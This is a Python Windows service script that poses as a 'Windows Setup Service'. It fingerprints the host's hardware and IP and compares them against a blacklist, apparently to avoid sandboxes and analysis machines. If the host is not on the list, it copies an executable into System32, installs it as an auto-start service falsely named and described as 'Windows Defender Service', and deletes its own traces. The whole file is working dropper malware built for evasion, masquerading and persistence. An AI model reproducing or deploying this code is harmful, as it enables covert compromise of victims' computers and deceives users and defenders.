import servicemanager, win32service, win32serviceutil, sys, os, wmi, shutil, subprocess, json, requests, re, socket, uuid, string, win32event

class WinDefSvc(win32serviceutil.ServiceFramework):
    _svc_name_ = 'SetupSvc'
    _svc_display_name_ = 'Windows Setup Service'

    def __init__(self, args):
        win32serviceutil.ServiceFramework.__init__(self, args)
        self.hWaitStop = win32event.CreateEvent(None, 0, 0, None)
        self.is_running = True

    def SvcStop(self):
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        win32event.SetEvent(self.hWaitStop)
        self.is_running = False

    def SvcDoRun(self):
        servicemanager.LogMsg(servicemanager.EVENTLOG_INFORMATION_TYPE,
                              servicemanager.PYS_SERVICE_STARTED,
                              (self._svc_name_, ''))
        self.main()

    def main(self):
        try:
            enable = True
            checker = True
            debug = False

            binary_path = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))

            def get_motherboard_serial():
                try:
                    c = wmi.WMI()
                    for board in c.Win32_BaseBoard():
                        return board.SerialNumber.strip()
                except Exception as e:
                    if debug: print(e)

            def getip():
                try:
                    ip = requests.get("https://api.ipify.org", timeout=5).text
                except requests.exceptions.Timeout:
                    return 'Failed'
                except Exception as e:
                    return 'Failed'
                return ip

            current_motherboard_id = str(get_motherboard_serial())
            current_ip = str(getip())
            current_mac = str(':'.join(re.findall('..', '%012x' % uuid.getnode())))
            current_wid = str(subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip())
            current_bios_serial = str(subprocess.check_output('wmic bios get serialnumber').decode().split('\n')[1].strip())

            if checker == True:
                blacklist_path = os.path.join(binary_path, 'blacklist.json')

                with open(blacklist_path, 'r') as file:
                    data = json.load(file)

                motherboard_hwid = data['motherboard_hwid']
                device_id = data['device_id']
                ip = data['ip']
                mac = data['mac']
                hw_guid = data['hw_guid']
                machine_guid = data['machine_guid']
                bios = data['bios']
                
                def string_checker(string):
                    getVals = list([val for val in string
                                if val.isalpha() or val.isnumeric()])
                    result = "".join(getVals)
                    return result.isdigit()

                if string_checker(socket.gethostname()) == True or string_checker(current_motherboard_id):
                    enable = False

                if current_ip in ip:
                    enable = False

                if current_bios_serial in bios:
                    enable = False

                if current_mac in mac:
                    enable = False

                if current_wid in hw_guid or current_wid in machine_guid:
                    enable = False

                if current_motherboard_id in motherboard_hwid:
                    enable = False

                if socket.gethostname() in device_id:
                    enable = False

        except Exception as e:
            enable = False
            if debug: print(e)
            pass

        try:
            if enable:
                WinDefSvc_exe = os.path.join(binary_path, 'WinDefSvc.exe')
                drives = ['%s:' % d for d in string.ascii_uppercase if os.path.exists('%s:' % d)]   
                for drive in drives:
                    users_folder = f'{drive}\\Windows\\System32'
                    if os.path.isdir(users_folder):
                        executable_path = os.path.join(users_folder, 'WinDefSvc.exe')

                try:
                    def check_service_exists(service_name):
                        c = wmi.WMI()
                        services = c.Win32_Service(Name=service_name)
                        return len(services) > 0
                    
                    def cleanup():
                        try:
                            os.remove(WinDefSvc_exe)
                            os.remove(blacklist_path)
                        except:
                            pass
                        self.SvcStop()

                    if not os.path.isfile(executable_path):
                        directory_path = os.path.dirname(executable_path)
                        shutil.copy(WinDefSvc_exe, directory_path)

                    if not check_service_exists("WinDefSvc"):
                        def install_and_start_service(service_name, executable_path, display, description):
                            command = f'sc create {service_name} binPath="{executable_path}" DisplayName="{display}" start= auto'
                            
                            try:
                                subprocess.run(command, check=True, shell=True)
                            except subprocess.CalledProcessError as e:
                                if debug: print(e)
                                return
                            
                            description = command = f'sc description {service_name} "{description}"'

                            try:
                                subprocess.run(description, check=True, shell=True)
                            except subprocess.CalledProcessError as e:
                                if debug: print(e)
                                return

                            start_command = f'sc start {service_name}'  

                            try:
                                subprocess.run(start_command, check=True, shell=True)
                            except subprocess.CalledProcessError as e:
                                if debug: print(e)
                                pass

                        install_and_start_service('WinDefSvc', executable_path, 'Windows Defender Service', 'Windows Defender Service provides real-time protection, scanning, and removal of malware and other potentially unwanted software. It safeguards your computer from viruses, spyware, ransomware, and other threats, ensuring the security and integrity of your system.')

                    cleanup()
                except Exception as e:
                    if debug: print(e)
                    pass

        except Exception as e:
            if debug: print(e)


if __name__ == '__main__':
    if len(sys.argv) == 1:
        servicemanager.Initialize()
        servicemanager.PrepareToHostSingle(WinDefSvc)
        servicemanager.StartServiceCtrlDispatcher()
    else:
        win32serviceutil.HandleCommandLine(WinDefSvc)
